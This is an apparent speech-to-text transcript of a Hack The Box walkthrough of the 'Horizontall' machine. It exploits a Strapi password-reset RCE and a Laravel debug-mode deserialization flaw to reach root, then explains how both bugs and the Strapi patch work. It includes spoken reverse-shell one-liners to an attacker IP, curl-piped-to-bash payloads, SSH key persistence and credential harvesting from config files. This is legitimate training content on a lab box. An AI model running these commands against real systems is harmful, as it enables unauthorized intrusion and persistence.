 what's going on youtube this ipsec me doing horizontal from hack the box which was a fun easy box that was all about just basic web exploitation it starts off with just finding a single web page and it's completely static there's nothing you can do there's not even two pages so you have to do the good old f12 exploit look at the source code and looking at some javascript you discover some endpoints of a different virtual host so you go into that virtual host and you find out this is like a str api application that has a known exploit so we do that and we get a shell on the box with that we just poke around we notice there's a different web server running on port 8000 this is running larval and debug mode that is open to an rce so we do that exploit it and get root on the box now this video is an hour long almost i believe so we're gonna do a lot more after that and just look at all the exploits see how they work see how we patch them things like that so let's just jump in as always we're gonna start off with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it horizontal and then the ip address of 10 10 11 105. this can take some time to run so i've already ran it looking at the results we have just two ports open the very first one being ssh on port 22 and its banner tells us it's an ubuntu server the next thing we have is http on port 80 it's also ubuntu and running engine x so let's just go take a look at the web server because there's not that much out there for nmap so i'm going to 101011 105 and it redirects us to horizontal.htb and i think nmap should have said this yeah it said did not follow redirect to horizontal so it did tell us that i just did not read it one of the um major cruxes when it comes to enumeration is just not reading all the output so i'm going to do sudo v etsy host and we can add it so 10 10 11 105 and then we put that ip address there and now we get a page so we have a few links up here and i'm clicking them all they're not doing anything i look at the bottom left of my screen and i see it ends with just an anchor tag so there's nothing there play video read more is not doing anything nothing here scrolling all the way down we got a contact us forum so i'm just going to test this out real quick and we will say if they can click a link uh a ref this is the link 10 10 14 8 is probably my ip address we'll put on port 8 000. test and let's see click here the next thing we can do is a script source and do the same exact thing and this would just be testing if like they click a link on this contact form or um there's crosstalk scripting of course if it doesn't work it doesn't say they don't click links maybe we need to do something else there but i always just like testing for the low hanging fruit as fast as i can and that's how i test that so we start up a web server i click send and nothing happens so i'm going to press f12 let's go into the network tab i'm going to reload the page because it tells me to do that i don't think i had to do that i think it would just show up if the request was sent nothing is going on the network and let's go check the console in case there's a javascript error nothing there so this contact form is broken we don't really have much we can do here so let's set up some automated recon so i'm going to do go buster dash u put in the url and then word list opt um set list word list discovery is what it is then webcontentraftsmallwords.txt dash oh for outfile i'm going to call this gobuster.out and the next thing i want to do is test if this is html php what is this so html resolves php does not uh i can try dot pot but that would never exist so um looks like it's just html so i'm not going to bother with extensions or i guess we could i guess we can do a x html and does not hurt and we're off to the races uh we have to put it in directory mode the other thing we could also do is a um virtual host fuzz so i'm going to do vhost so go buster v host word list up sec list uh discovery dns and we'll try subdomains i guess let's see subdomains top million of this is in the background so we can let it take a while uh dash u htp dash o go buster.v host dot out there we go so we got two things running in the recon let's take a look at the website so we are already said there's like no user interaction with the site so the next step is just to look at the source and this is pretty ugly i'm surprised it's not like line breaking it up for me uh we can try chromium maybe chromium will do a better job so i press alt i think that's f2 i hit let's see alt f2 yep muscle memory so i'm going to try horizontal.htb view the source here and i wanted to say i'm used to seeing like a predefined like pretty fire icon but i don't see it for html let's see it did have that line wrap which was relatively nice so we have css i don't really care about cascading style sheets we have these two javascript files normally when i'm doing any analysis i always pick the one that does not say chunk first so this is the one i'm going to start with and i think chunk is just like chunks of this javascript so that's where i start with that and this again doesn't have a pretty function we can view this in firefox to see if it looks any different i'm really used to having a button like in the bottom right that i click but for some reason that's not there or maybe like i'm just dreaming about that button so we have a lot of javascript there i'm just going to google javascript beautify of course we have to tell it to go to google go here and we can paste and beautify the code and then instead of viewing on this site i'm going to open up codium which is just visual studio code and let's just save this to a js file so we have syntax highlighting horizontal let's call this um app.js i guess so put that in paste this code and now we have a lot more lines than i wanted to read i don't feel like reading 600 javascript lines uh that is okay that's a png i just saw a bunch of text i'm like that's a base64 blob nope that's just encoding an image so lots of lines here um where can we start well i always like starting with grap so we could do like fine with ctrl f here but i like seeing everything to screen because i think it's just more efficient so first thing i do is search its host name and we have a hit so we have a sub domain api-prod i wonder if that's in any word list just out of curiosity let's see cd opt set list graph dash r for recursive this on current working directory uh we probably will want to say begins with that carrot and then ends with a line break so if we used oh we would have actually found that with this super large word list so with enough time brute force will always be effective so this should tell us the sub domain but we can get it much quicker through source code so let's try this api prod so i'm going to go api-prod.horizonto.htb [Music] and we have to add it to our host file so let's see right here sudo v that's it's already up here api prod horizontal.htb save it refresh and we have the api so the very first thing i'm going to do is let's just send this over to burp suite because this is normally my fastest way to just view headers i could do like curl dash v i believe and view headers that way but um i just like burp suite for this so we start it up we can close out chromium because we don't need it go to proxy intercept is on refresh the page go to burp and we can look at the server header let's see server nginx okay so the main thing i was checking for is if this is a different server header because if it's now apache or something like that we know we have some type of virtual host routing based upon the host name because we went to a different web server it could also be going into like docker or something like that so again i always like just checking the server whenever i do anything i suspect i could go to a different host um nothing else really here in this header so i guess we should brute force or not brute force but um run yet another go buster so let's see go buster we didn't get any clicks on that like cross-site script testing and now that i say that i remember we never actually sent something because that contact form was just broken but uh yeah so go buster dash u put in horizontal uh dash w for list opt set list and then we can do discovery web content and we'll say raft small words dot text and i guess i'm gonna kill these other two go busters because i don't like running three two's generally my limit we do have a few hits back admin and admin with a capital a so right now we know the api is not case sensitive so i can change this to lowercase.txt which will go a lot quicker and we have admin users and reviews users gets a 403 but reviews and admin gets 200 so let's check those out so let's go to slash admin and normally for like fuzzing uh these type of apis i'd use ferro buster or ferrox buster however you pronounce that name but the reason why i'm not is because i haven't shown it yet and it doesn't do a good job on this box and i'll show exactly why at the very end of the video but looking at this reviews we get a json blob yep it's just straight json and a browser showing it just saying how good the horizontal service is and then on this page we get a login with str api if we just went to exploitdb and we type sdr api we can find out it's some type of framework with some rce code we got a unauthenticated rce authenticated rce and a way to set passwords i always like going for the rze first so let's just see what we have it is doing a password reset so i'm guessing it just resets the password and then does something to get code execution we can see this here so we'll dig through this exploit i guess also at the end of the video if i remember we have some things we're working on hold on i just want to make notes of my promises so i don't break them so we want to go over um why didn't do ferro buster um str api exploit so i have some notes on what i want to go so let's just copy that and i guess we could have used search plate i actually don't know why i didn't do that in the first place of just str api uh we probably have to update search point so if i updated it let's see come on finish the update i probably need to do that as root now that i'm thinking about it but let's do exploit dot pi it'll just kill this out oh it's hang okay you'll do you paste this and we have something here so it hits the url ends with check version password reset terminal so we do have a check version thing that's the first thing i'm going to check to see if we're even vulnerable and we can see it does url admin annette so let's try hitting that url real quick so admin slash init and boom we have it so 300 beta 17 4 300 beta 17 4. so we do definitely have some type of exploit so let's see python 3 exploit.pi okay url http and we probably have to give it something else i would think maybe it prompts us let's see v1 check version password reset code exec where does it get command from cmd okay so there we go if i do who am i it's weird that it's in a cmd loop i remember seeing uh that's a blind rce don't expect output but normally when you do the cmd loops uh you get output but oh well uh i guess the first thing we can do is test if we have um it vulnerable and it looks like my search plate dash u just wiped out search boy awesome let's do python3 dash m http server curl 10 10 14 8 port 8 000 we get to hit back so we know we have code execution um i guess i can just do bash dash c i was thinking of should i just curl and pipe it to a shell or we can do the one liner i'm just gonna do the one liner bash dash i devtcp 1010 14 8 9 000 1 0 and 1 like that should be good sudo ncl vmp 9001 and we get a shell back awesome so python 3 dash c import pty pty dot spawn ben bash stty raw minus echo fg enter and probably the better way to do that um hold on i should get in the habit of doing this more often let's just exit i typed reset there so getting the shell again because i know a lot of people nowadays are on zsh so i'm to do the same thing python3 c import pty pty dot spawn bin bash control z stty raw minus echo and then put the semicolon fg and what this does if you're on that um new shell not bash i think it's zsh um every time you get a terminal prompt it kind of resets it so this command doesn't work however if you put the fg on the same line as it it never hits this terminal prompt again and doesn't reset you and that's how you get the proper shell working that way when you use esh but let's just export term is equal to x term and we can begin the um enumeration the first place i like starting is just looking around the web app i'm sure if i just ran lin p's that get my answer right away but when you just run an automated recon script and look at the results and then run a command off that you don't really learn anything so i always like just poking around a little bit to see what i can find on my own and also this is less noisy and things like that so it's just good to do i'm looking at api i only see the review which is weird i expected to see admin like weird um this is probably the str api and it is a node module so maybe str api's admin route is default which makes sense because it was admin init and told us the str api version so that's probably why we don't have anything there i'm looking at routes let's see i was hoping i would find like where the password for this is i guess we could look at controllers less controllers review see look at all the ports listening it is my sequel so there's probably uh my sequel port listening somewhere and we also have this port elite and it's running node.js and that's not really that interesting um to you it may stand out as super interesting but that's the application i'm hitting so on port 80 we know this is engine x and how engine x works a lot of the time is it doesn't have any modules that actually execute code like apache when you have apache running a php web app the actual apache thread is executing that php app in most cases unless you use like fpm which is a pool manager but for most people just setting up a web app for the first time they just let apache execute the code engine x doesn't exactly do that it passes it somewhere else and that application is running it so like in python applications you'd have wsgi a web service gateway interface i believe and an application runs that and either listens on a port which nginx would do proxy pass or you'd create a socket which is just a file descriptor so you don't have the overhead of that tcp handshake when you're proxying the web app and it's a lot faster in this case it's a proxy pass so i bet if i went into etsy engine x we do sites dash available sure look at horizontal.htb let's just cut it out because it did not fix my terminal fully we can see uh location slash is set to proxy pass if you remember like probably 10 minutes ago i was talking about it going to a different server so if this was an http local host and this was like 10 10 11 258 or 258 definitely wouldn't be uh 248 um colonly then you'd potentially get a different server header because whenever someone access this the engine x is behaving as a reverse proxy and sending you somewhere else so that's how all that works um i'm still confused on everything so on port 80 it's just going to ver www.html horizontal and then on api-prod it's going to this port elite okay and if i didn't say it that's also why like when you have python node apps you're generally not www data because people will create a specific user for that application so you become that user the downside to that actually is since i'm a user i have probably a shell by default and everything let's see cat etsy password grep str api i do have a shell so i don't even have to do this fancy reverse shell i can just make dirt.ssh and then we do v id rsa and let's just drop a um key in so let's see s h dash key gen dash i str api uh dash f we want file i don't know why i thought i oh i is how you use a key so that's probably where my mind went but dash after file we grab this paste it in uh we want that to be authorized keys not idrsa chmod 600 and then chmod 600 str api which is the private key sh-i str api sdr api at 10 10 11 105 i believe yes there we go we're logged in it's just on a s8 shell so i'm just going to do bash and now we have a full shell so when i run things like less and vi it works perfect um i could have done like st2y columns and everything and fix it that way and if you watch my video last week on anubis or cannabis or however you pronounce that box it was all about a windows box where you do the certified pre-owned attack and add a smart card to your user this is kind of the equivalent of it right i don't know str api's password but there is an authent uh alternative authentication method through ssh keys on windows we used a smart card certificate and this we're just using an ssh key to log in so those things are always handy the plus side to the windows one is we could do it on a user that we did not have for this linux one ssh is pretty hardened it's really hard to write your key to another user and then do lateral movement that way but that was a tangent that may have just confused more people more than helped oh well um let's see uh i can grab for password i guess let's get ri password and we're gonna get way too much i don't know where the password would be in this app um just in config maybe and i'm probably gonna move on a little bit um thought about like as i was talking should i just remove this section because i'm not getting anywhere analyzing the app but i mean this is common right uh we got a production config there's a server.json maybe that's it come on a  config that's telling me to listen on port elite cat security dot json less you know i bet this isn't a database and i'm just looking at this thinking there is one let's api prod reviews this is a good service we'll go for this one so grab ri paste this nope oh wait i'm in config find the string i probably don't need the i but nope that's not there we can say satisfy with this product real quick crap nope not there so i think it has to be in this config directory we can just grab this for password and there we go so we have a password it's set in environment or maybe just in development so i'm going to do end or let's grab this again environment grab data and capital and it's not in my environment and i got a webshell through the app so i'm guessing we're running in development mode and let's look at this database.json which i should have known that [Laughter] when i was like looking at file names looking for the database password i should have just said hey database.password but it goes to show not everything sticks out like a sore thumb so we can do mysql dash u developer dash p and this probably won't work i probably have to well no it does um i was gonna say maybe i have to specify the database we're gonna do show databases and we have sdr api so we can use this and then show tables see we have a user permission user so let's do select star from users permission user let's see where's my typo see describe users permission user i'm actually not sure what's going on here show tables select star from reviews that works select star from users does not exist i wonder if it just doesn't like this underscore roll see dot description i'm actually not sure what's going on here i was hoping to get like hashes out of potential users but let's just move on and i'm going to look at the comments to see exactly what i screwed up there so after looking at this web app for a while um we did get a password we could try like su with it to see if that is the root password of this box but we don't really have too much so let's go back and run lynn p's so opt uh privilege escalation script awesome suite and we can go win peas python 3. do i have something listed on port 8000 already do not so let's just copy this to htb this is horizontal go in that directory make the directory dub dub dub and move win ps in that directory python3 dash m http server and we can just curl 10 10 14 8 8 000 len ps.sh pipe it over to bash and we'll see what this tells us i guess while that runs um i had a fun idea i don't know if this is gonna work but let's go back into this uh config we're reliving the my sequel thing while when p's runs but uh this is a crazy idea i have for enumerating this we'll see if it works crap for user or pass there we go i'm gonna run my sequel dump do we have it we do dash u developer dash d for database and i would think it was the str api database say dash p and i'm going to pipe it to out we enter the password i wonder if i have write access into this directory cat out i may have just dumped the database which i'll be happy about i'm not sure what my select did not work but it may have been fine and it's probably just some sql thing i don't know of how it decided to do it so user permission looking for a password there we go it's definitely in this user permission user thing we got password it's set to varchar 255. let's see grab dash i admin on out see password out is that table just empty so the file finished or when p is finished i'm just going to use them real quick to view this let's see drop table create table create table it's only creating things i think mysql dump would dump data as well by default dump data see all databases yeah it's not telling me there's like a flag to just say hey only um to dump everything there are flags to only dump like the schema of the database but it doesn't look like it's for that i'm just gonna guess this isn't like a fully configured instance or something or there's too many lines here and i'm being impatient to read through them all but we do have linp's output so let's look at this path system stat cpu info environment protections unmounted file system software compiler here we go so there is uh pm2 running this is like a pool manager i believe for php and it's running in pm2 i want to say that is but oh no that could be node never mind pm2 is a pool manager for node.js um i remember a few bucks ago i said i wrote my first like node app and i used pm2 in order to um run that so i'm normally doing like php web apps or something like that so when i saw pm2 i went like oh that's probably i know that from my php days but no um that was certainly a nerd thing so nothing unexpected there really binaries cron jobs system timers network information we are listening on port 8000 on localhost so we probably want to take a look at that um yes ef so the one thing interesting i noticed when i was looking at that process output is i only see str api and this is just a linux thing i don't know why it's not default honestly but um it's how you mount slash proc so identify cat slash etsy let's see where is proc uh let's see let's just do the mount command prock come on you know when you see something you're like i know exactly how to do this and then you look like they're not doing it the way i expect there you'd be surprised how often that happens let's see there should be a flag that hides it and i guess they just did it a different way which i don't know how they would have done that without this so i process other users linux hide pid so generally how i do it is this way um let's see what file they do mouth dash oh remount yeah etsy uh fs tab n slash proc hide pit equals two let's mount grab hide pid oh it's there i again too much output for me to read so we have hide pit equals two which is going to hide the process of other things on the box so there was port 8 000 listening let's take a look at that um the way i normally do port forwards and i just do uh i think that let's see um c c is the magic key so if on the very first line you type this the squiggly c it drops you in that command prompt but it has to be the very first thing you type so if i do like that doesn't work so new line c and now that ssh prompt and i can say listen on port 8000 forward it to 127.001 8001. uh i did that backwards so listen on my box port 8001 and then go through this ssh connection on 12701 and end up at port 8000. so 127.001 port one and now we go here which looks like it is larval if you also wanted to um you didn't have to do it through that method you can just say dash l8001 127001 8000. so you can put the command there as well and it works so we can still access this uh we can click on everything we have installation this is just leaking over to laravel so that's not interesting um let's try and go buster against it so go buster dash u we have to put it in directory mode new word list opt set list word list or discovery for web content wrapped small words dot text and we can just run through these real quick we have a slash profiles we look at this we have an error message and it's in debug mode telling us exactly where the error message is so if we google like laravel debug rce we can find there is a exploit for it and i guess we can go over this exploit at the end of the video but let's run it v [Music] exploit dot pi i think it was python uh we'll call it exploit two dot pi set paste run it i did not copy the whole thing let's see it's going to view raw w get mv low of old dot pi there we go so we want to go http uh 127.001 8001. we had to figure out where larval storing logs i wonder if we can access this with our user i don't know why my ssh died there let's see bash cd do we have access to directory we do not html so there is no larval directory so let's see fine slash to dev null crap floral i wonder if we just can't see the directory that is weird but if the exploit doesn't work it's probably going to be because of this path so let's run it it's exploiting and i'm going to probably pick a different exploit so let's see exploit db level let's see we can try this one this is by the exact one i just looked at right this is looking like it 492 yep this is the exact exploit um do we have the cve number in here we can try googling for that try a different exploit script so lab setup get clone recommends monologue go to raw two dot pie and i guess after we run this um look at differences and exploits so one required a full path to where larval is storing logs and this one does not so we should see like how this person got around that requirement because that's interesting to me right like this is either a completely different exploit or maybe they're not using a full path or something like that so get clone usage we specified that monologue rce id why does my port keep dying there we go we actually got code execution i'm going to try the old one real quick just to make sure like my port had not died give it a few seconds yeah so i'm guessing this exploit doesn't work but this one did so bash dash c let's do this in double quotes bash dash i tcp 10 10 14 8 9 000 1 0 and 1 like that nc lvnp 9001 run it and it's not calling back to me let's see can i curl girl 10 10 14 8 specify 9001 okay i can so what i was doing there is there's probably bad characters in this um reverse shell i'm doing if i had to guess it's probably going to be um like a plus or not plus i don't you have a plus but probably the and sign the and sides probably needs to be url encoded um but i can just get around that by hosting a web shell i'm listening on port 8000 already with my web server so i'm just going to call this shell and we can do bash dash uh i same exact thing dev tcp 10 10 14 8 9 000 one zero and one okay and let's listen i'm going to run this again i'm just going to pipe or do 8000 shell and then pipe it over to bash so now it's going to run curl against the file on my web server and pipe to bash the only bad character here could potentially be a space or a pipe character and that's it we are root so let's go in root let's go sh let's add our key so what is str api.pub let's copy this add it so echo to authorized oh god i think my shell died yep everything died get the shell again status h echo two authorized keys okay sage dash i root at 10 10 11 105. and now we are rooting this box so we can exit this and begin explaining everything we wanted to so the very first thing um i wanted to run uh fairy bruster ferrix buster i probably should have looked at the wiki more to understand um how to pronounce it but the reason why i didn't because the reason why i wanted to run it is if we look at this api and api prod horizontal api if we go like slash admin we get a page and that was what admin slash a net with something admin slash user was another thing uh admin auth it was admin auth but the thing i didn't like is if i ran this and this is just an app so i just did apt install um let's see dash u hdp if i just ran this opt or set list discovery web content raft small words lowercase.txt so this is recursive so it should be able to go into admin and then say hey admin slash i should do another brute force here and when we run this we see it doesn't actually do that and i was like why didn't you do that because that's what like that's why i want to use the tool um but if i curl this or we don't have to curl we can just do it through grip suite if i do slash admin we get the 200 okay admin bunch of things see still 200 okays so it's always returning 200 on this which is breaking my way to enumerate the api we also have x powered by sdr api and this header do we have them just slash admin have it on slash we did have that i don't know why i didn't see that when i was talking earlier but yeah you have powered by sdr api and a header here so if i just did horizontal.htb we don't have powered by str api but we do here so you do know you're hitting probably some type of different server since it's adding all these x adders but um that's why i wanted to show off this tool but why i didn't i chose not to show it in my main thing because it did the same thing as go buster so whenever i show new tools i generally like showing what i liked about it and i like the recursion unfortunately just the way the web app works here we can't do any recursion on the api to have an automated tool to do its best job the next thing we want to look at oh this is probably what was it oh the str api exploit so i know i keep changing panes rapidly i'm sorry let's see uh that was probably exploit.pi so let's see what's happening here we got a terminal it does that check version command password reset so we're passing an object as the code and we're setting the password super strong password so i'm guessing the username is admin and we set this password to this so we should be able to log in with this i don't know where it's getting the username from like why that code just reset admin unless we just like reset all the users so we check version we execute password reset and we're not specifying a user id okay that's that's a bit weird let's see grep super out of exploit and we can grab this see admin and we log in okay reviews users content manager so that's how that worked and the vulnerability here probably is um i was gonna say object injection but this is using my sql i thought i'm getting more confused as i think about this application um normally there's like a no sql thing uh if you look at ipsec.rocks and type like nosql or injection you'll probably come across it but i bet if we went to estear api source code we look at this let's go to issues search is issue security see do we have anything node forge see security reset reset password and username let's see do we have when the cve was 2021 of course the dates aren't on this oh no they are 2020 so 2021 i'm looking for just um the commit that fixes this so we can look for a 2021 it's not on this page what do we hear november 2021 when was this see support node can't install enable upgrade a male gun thing see str api password reset vulnerability see if i can find it here exploit db do any of these linked to the github nope because people generally don't care here we go here's the changes i see a lot of the blog players don't really care how the vulnerability works and they just post exploit code which i don't like so wait what oh what is he 20 i looked at the date 2021 so that was created after this box i guess but the actual cve was 2019 so here it is and it may look like a weird fix what it's doing is code i'm guessing code is going to be this just raw and there's no sanitization here so it just passed in an object so let's go open up something where we can run javascript like our browser console you can say x is equal to gt 0 right if i do type of x i'm an object and when it gets this this is where the like injection comes in because it's getting an object doesn't expect that um it expects a string like the reset code should be like one two three four five six obviously that's not it but that's how it should be um what this is doing is i think it's a string literal so if i do this and then x we see it says object object which is just a string of tell me what it is so if i um type x come on where's my hand there we go ah wait so i did this i can say y is equal to this and we do type of y and it's undefined i'm going to reset this because i think i confuse myself so x we're going to say um exploit is equal to that type of exploit is object i'm going to say patched is equal to exploit and we do type of patched and string that's what i was expecting i don't know exactly what i screwed up before but using um proper variable names helps but we can see that's now a string so when it's doing this find one instead of doing an object and treating it like an object going in and doing hey is this ever greater than zero then if so reset the password now this is saying hey is this set is this password reset thing set to object object if not um we're not going to reset you so that's the patch there um after that let's see what we do so we reset the password and then we enter this cmd loop so where is it class terminal password reset see unsuccessful was successful here we go we go with code exec and it really helps if people put like line breaks after the function also like i always like commenting code like this executes code by and explaining but let's see so this logs in and gets the token oh plugin documenting wow so it's just going to install a plug-in and then guessing it's just a system command on plug-in install of sto api because they're just doing and and and then your command so that's as simple as that is so it probably does like npm install space documentation and we just do that wow that was easier than i thought to analyze that but okay next thing we wanted to go into let's see differences and the two php exploits okay for this i'm going to use codium and the main reason why i'm using this is because i want to open them side by side so let's see i think we did these two right it was larval and larval too and i can say open or split left okay so this is the working version this is the not working version so generate payload we're using some far so this is using php gadget chains i believe to build a bunch of payloads i probably shouldn't analyze this exploit before saying i do it so doing a php filter right convert doing all that generate payload and giving it the path okay where's the path here okay so yeah this is simple so the exploit itself um if i remember correctly the debug mode just enables you to um execute code because it's helpful for debugging um never run applications in debug mode there's so many bad things that come from debug mode uh let's see debug rce see if i can find a good post that goes over it hatrix maybe this testing log now this is just talking about the exploit um i think it was code igniter that does it right codeigniter ambionics this is the first the blog you probably want to read because it talks about it and says um this plugin for this enables debug mode and it actually makes the debug messages pretty um let's see i don't know like why you want pretty debug modes but uh it's besides the point so what it does is it knows we're going to be in the larval directory so it just says okay let's go up one directory that's where the storage is and we go here on this exploit we can see the php filter does not do that and it wants the absolute path so this is just doing a relative path work around um let's see where that actually exists right because we have root so we should be able to find larval.log fine do i have located on this box probably not nope oh fine alert locate level.log yeah it's in home developer and then my project do i have access to this i probably don't right because that was sdr api and that's developer and oh i may have had access to that did i miss that let's do su-str api bash home developer my project denied okay so did not have access to it but that's how that works we can kind of dig through i guess the exploit let's see how do i close this pane close all there we go so step one it's going to clear the logs so if you've ever done a local file inclusion against logs you know um you put one bad log in there and it breaks all future exploits because the code process is top to bottom and if there's a bad code it just always is going to error before it hits the new line so step one clear the log and then we write i guess a new log and we create a second log entry with a far payload this is just like a php arc now i don't think is it a php archive or just an archive in general so it's a yeah way to bundle php code so we encode that we convert the log file to a valid fir and then we trigger the d serialization so i'm guessing let's see my project storage logs guessing we'll have two hits here let's see is there a cleanup here or something we trigger the vulnerability and then it cleans itself up so i don't want to do that real quick i want to see exactly what the log looks like is it in this one there's mono right let's see what pain did we exploit this in not there it's probably this oh well we'll just rerun the exploit python3 lowervolt2.pi [Music] http 127.01 8001. we have to i think my thing is already set up still i was expecting my ssh time would be dead where is it undefined oh did i get rid of it let's see level debug exploit do i have mono here try and get the name of that chain monologue rce1 maybe that's it id okay dash l so my sh tunnel did die okay so now we fully executed and it did not clear the logs so if i do head dash one larval.log telling php hot compiler then what this is doing is creating this then do we have another line so i think it makes three requests right stack trace internal so i'm not exactly sure the whole code path to getting card execution but you can see this is generally the path i would go if i wanted to keep digging down it if you want to i'd probably just read this blog post it looks like it's good so um yeah that'll be it take care guys and i'll see you all next week